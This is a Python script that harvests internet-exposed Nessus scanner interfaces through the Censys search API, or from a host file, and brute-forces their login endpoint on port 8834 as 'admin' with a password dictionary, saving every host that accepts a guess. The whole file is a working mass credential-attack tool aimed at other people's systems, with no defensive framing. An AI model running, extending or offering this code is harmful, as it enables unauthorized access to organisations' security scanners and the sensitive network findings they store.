#!/bin/python3

import requests
from tqdm import tqdm
import sys
import socket

port = "8834"
user, password = "admin", "admin"
UID = "ENTER ID"
SECRET = "ENTER SECRET"

def make_req(hst, prt, usr, pss):
    headers = {"Host":hst+":"+prt, "Content-Length":"46", "X-Api-Token":"25AF139E-4DE2-4969-A5CA-8F38D9BDC98C"}
    try: r = requests.post("https://" + hst + ":" + prt + "/session", headers=headers, data={"username":usr,"password":pss}, verify=False, timeout=10)
    except: return -1, -1, -1, -1
    try: 
        decodedContent = (r.content).decode()
        if not "error" in decodedContent: return hst, prt, usr, pss
        else: return hst, prt, -1, -1
    except:
        print("Potential issue on host: " + hst)

def get_page(next):
    ips = []
    if next == None: res = requests.get("https://search.censys.io/api/v2/hosts/search?q=NessusWWW&per_page=100", auth=(UID, SECRET))
    else: res = requests.get("https://search.censys.io/api/v2/hosts/search?q=NessusWWW&per_page=100&cursor="+next, auth=(UID, SECRET))
    if res.status_code != 200:
        print("error occurred: %s" % res.json()["error"])
        return ips
    values = res.json()["result"]["hits"]
    next = res.json()["result"]["links"]["next"]
    for x in range(0, len(values)):
        ips.append(values[x]["ip"])
    return ips, next

def get_all():
    total = []
    ips, nextPage = get_page(None)
    total.append(ips) 
    counter = 0
    while nextPage != '' and counter < 50:
        counter+=1
        ips, nextPage = get_page(nextPage)
        total.append(ips)
    return [item for sublist in total for item in sublist]

def read_n_parse(file):
    ips = []
    f = open(file, 'r')
    lines = f.readlines()
    for line in lines:
        if "Host: " in line: ips.append(line.split(" ")[1])
    return ips

def load_dict(file):
    passwd = []
    f = open(file, 'r')
    lines = f.readlines()
    for line in lines:
        passwd.append(line)
    return passwd

args = sys.argv
u_c = False
if ("-i" in args): input_file = args[args.index("-i") + 1]
if ("-d" in args): dict_file = args[args.index("-d") + 1]
if ("-o" in args): out_file = args[args.index("-o") + 1]
if ("-use_censys" in args): u_c = True

# hosts = read_n_parse(input_file)
passwds = load_dict(dict_file)

if(u_c): hosts = get_all()
else: hosts = read_n_parse(input_file)

host_pair = []
if dict_file != None: passwds = load_dict(dict_file)
else: passwds = [password]
for host in tqdm(hosts):
    for pw in passwds:   
        h, _, u, _ = make_req(host, port, user, pw)
        if u != -1: host_pair.append((h, pw))

print("DONE!!!")
print(host_pair)
if out_file != None:
    with open(out_file, 'w') as f:
        for item in host_pair:
            f.write("%s\n" % item[0])